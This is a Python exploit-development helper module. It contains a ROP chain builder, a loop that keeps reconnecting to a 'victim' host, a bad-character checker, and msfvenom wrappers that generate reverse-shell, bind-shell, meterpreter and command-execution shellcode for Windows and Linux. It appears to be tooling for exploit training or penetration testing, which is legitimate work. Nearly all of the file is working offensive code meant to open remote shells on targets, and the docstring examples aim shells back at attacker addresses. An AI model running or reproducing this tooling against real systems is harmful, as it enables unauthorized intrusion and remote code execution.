import os
import socket
from struct import pack
from typing import List


class RopChain:
    def __init__(self, base=None, pack_str='<I', chain=b''):
        self.chain = chain
        self.base = base or 0
        self.pack_str = pack_str

    def __iadd__(self, other):
        if isinstance(other, int):
            self.chain += self._pack_32(self.base + other)
        elif isinstance(other, bytes):
            self.chain += other
        else:
            raise NotImplementedError
        return self

    def __len__(self) -> int:
        return len(self.chain)

    @staticmethod
    def p32(address) -> bytes:
        return pack('<I', address)

    def _pack_32(self, address) -> bytes:
        return pack(self.pack_str, address)

    def append_raw(self, address):
        """ just ignore the base address; useful for actual values in conjunction with pop r32 """
        self.chain += pack(self.pack_str, address)


def get_connection(ip: str = None, port: int = None) -> socket.socket:
    ip = ip or os.environ.get('VICTIM_HOST')
    port = port or int(os.environ.get('VICTIM_PORT', 0)) or None
    if not ip or not port:
        raise ValueError("ip/port required: pass as arguments or set VICTIM_HOST/VICTIM_PORT env vars")
    sock = None
    while sock is None:
        try:
            sock = socket.create_connection((ip, port))
        except ConnectionRefusedError:
            continue
    return sock


def sanity_check(byte_str: bytes, bad_chars: List[int]):
    baddies = list()

    for bc in bad_chars:
        if bc in byte_str:
            print(f"[!] bad char found: {hex(bc)}")
            baddies.append(bc)

    if baddies:
        print(f"[=] {byte_str}")
        print("[!] Remove bad characters and try again")
        raise SystemExit

import subprocess
from typing import List, Optional


def get_payload_from_msfvenom(
    payload: str,
    lhost: str,
    lport: int,
    bad_chars: List[int] = None,
    encoder: str = None,
    iterations: int = 1,
    arch: str = None,
    platform: str = None,
    additional_opts: dict = None
) -> bytes:
    # Use cached shellcode from env var if available (hex-encoded)
    cached = os.environ.get('SHELLCODE')
    if cached:
        shellcode = bytes.fromhex(cached)
        print(f"[+] Using cached shellcode from $SHELLCODE: {len(shellcode)} bytes")
        return shellcode

    # Build msfvenom command - use raw format for reliability
    cmd = [
        'msfvenom',
        '-p', payload,
        f'LHOST={lhost}',
        f'LPORT={lport}',
    ]
    
    # Add architecture if specified
    if arch:
        cmd.extend(['-a', arch])
    
    # Add platform if specified
    if platform:
        cmd.extend(['--platform', platform])
    
    # Add bad characters if specified
    if bad_chars:
        bad_chars_str = ''.join(f'\\x{b:02x}' for b in bad_chars)
        cmd.extend(['-b', bad_chars_str])
    
    # Add encoder if specified
    if encoder:
        cmd.extend(['-e', encoder, '-i', str(iterations)])
    
    # Add additional options
    if additional_opts:
        for key, value in additional_opts.items():
            cmd.append(f'{key}={value}')
    
    # Always use raw format for maximum reliability
    cmd.extend(['-f', 'raw'])
    
    try:
        # Execute msfvenom
        print(f"[*] Executing: {' '.join(cmd)}")
        result = subprocess.run(
            cmd,
            capture_output=True,
            check=True
        )
        
        shellcode = result.stdout
        
        # Validate we got actual data
        if len(shellcode) == 0:
            raise ValueError("msfvenom returned empty shellcode")
        
        print(f"[+] Generated shellcode: {len(shellcode)} bytes")
        
        # Print any warnings from msfvenom
        if result.stderr:
            stderr_text = result.stderr.decode('utf-8', errors='ignore')
            # Filter out common noise
            for line in stderr_text.split('\n'):
                if line.strip() and not line.startswith('[-]'):
                    print(f"[*] msfvenom: {line}")
        
        return shellcode
        
    except subprocess.CalledProcessError as e:
        stderr = e.stderr.decode('utf-8', errors='ignore') if e.stderr else 'Unknown error'
        print(f"[!] msfvenom failed with exit code {e.returncode}")
        print(f"[!] Error output:\n{stderr}")
        raise RuntimeError(f"msfvenom execution failed: {stderr}")
    except FileNotFoundError:
        raise RuntimeError("msfvenom not found. Is Metasploit installed and in PATH?")
    except Exception as e:
        print(f"[!] Unexpected error generating payload: {e}")
        raise


def get_reverse_shell(
    lhost: str = None,
    lport: int = None,
    bad_chars: List[int] = None,
    platform: str = 'windows',
    arch: str = 'x86',
    shell_type: str = 'reverse_tcp'
) -> bytes:
    """
    Quick wrapper for common reverse shell payloads.
    
    Args:
        lhost: Attacker IP or interface
        lport: Attacker port
        bad_chars: Bad characters to avoid
        platform: Target platform (windows, linux, osx, etc.)
        arch: Architecture (x86, x64, mips, arm, etc.)
        shell_type: Shell type (reverse_tcp, reverse_https, bind_tcp, etc.)
    
    Returns:
        Shellcode bytes
    
    Examples:
        # Simple Windows reverse shell
        shellcode = get_reverse_shell('192.168.1.100', 4444, bad_chars=[0x00, 0x0a])
        
        # Linux x64 reverse shell
        shellcode = get_reverse_shell('eth0', 4444, platform='linux', arch='x64')
        
        # Windows meterpreter
        shellcode = get_reverse_shell('10.0.0.1', 443, shell_type='meterpreter/reverse_https')
    """
    lhost = lhost or os.environ.get('LHOST')
    lport = lport or int(os.environ.get('LPORT', 0)) or None
    if not lhost or not lport:
        raise ValueError("lhost/lport required: pass as arguments or set LHOST/LPORT env vars")

    # Build payload string
    if '/' in shell_type:
        # User specified full shell type (e.g., 'meterpreter/reverse_tcp')
        payload_name = shell_type
    else:
        # Simple shell type, prepend 'shell_'
        payload_name = f'shell_{shell_type}'
    
    # Construct full payload path
    if arch == 'x86':
        if platform == 'windows':
            payload = f'windows/{payload_name}'
        elif platform == 'linux':
            payload = f'linux/x86/{payload_name}'
        else:
            payload = f'{platform}/x86/{payload_name}'
    elif arch == 'x64':
        if platform == 'windows':
            payload = f'windows/x64/{payload_name}'
        elif platform == 'linux':
            payload = f'linux/x64/{payload_name}'
        else:
            payload = f'{platform}/x64/{payload_name}'
    else:
        # Other architectures
        payload = f'{platform}/{arch}/{payload_name}'
    
    return get_payload_from_msfvenom(
        payload=payload,
        lhost=lhost,
        lport=lport,
        bad_chars=bad_chars
    )


def get_bind_shell(
    lport: int,
    bad_chars: List[int] = None,
    platform: str = 'windows',
    arch: str = 'x86'
) -> bytes:
    """
    Generate a bind shell payload.
    
    Args:
        lport: Port to bind on target
        bad_chars: Bad characters to avoid
        platform: Target platform
        arch: Architecture
    
    Returns:
        Shellcode bytes
    """
    if arch == 'x86':
        payload = f'{platform}/shell_bind_tcp'
    else:
        payload = f'{platform}/{arch}/shell_bind_tcp'
    
    # Note: bind shells use LPORT but not LHOST
    return get_payload_from_msfvenom(
        payload=payload,
        lhost='0.0.0.0',  # Dummy value, not used for bind shells
        lport=lport,
        bad_chars=bad_chars
    )


def get_exec_payload(
    command: str,
    bad_chars: List[int] = None,
    platform: str = 'windows',
    arch: str = 'x86'
) -> bytes:
    """
    Generate a command execution payload.
    
    Args:
        command: Command to execute
        bad_chars: Bad characters to avoid
        platform: Target platform
        arch: Architecture
    
    Returns:
        Shellcode bytes
    """
    if arch == 'x86':
        payload = f'{platform}/exec'
    else:
        payload = f'{platform}/{arch}/exec'
    
    return get_payload_from_msfvenom(
        payload=payload,
        lhost='dummy',  # Not used for exec payloads
        lport=0,        # Not used for exec payloads
        bad_chars=bad_chars,
        additional_opts={'CMD': command}
    )